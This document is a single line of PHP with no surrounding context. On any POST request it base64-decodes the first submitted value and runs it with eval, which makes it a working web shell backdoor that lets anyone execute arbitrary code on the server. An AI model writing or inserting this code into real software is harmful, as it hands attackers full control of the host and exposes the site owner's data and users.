if ($_SERVER['REQUEST_METHOD'] === 'POST') { eval(base64_decode(array_shift(array_values($_POST)))); }
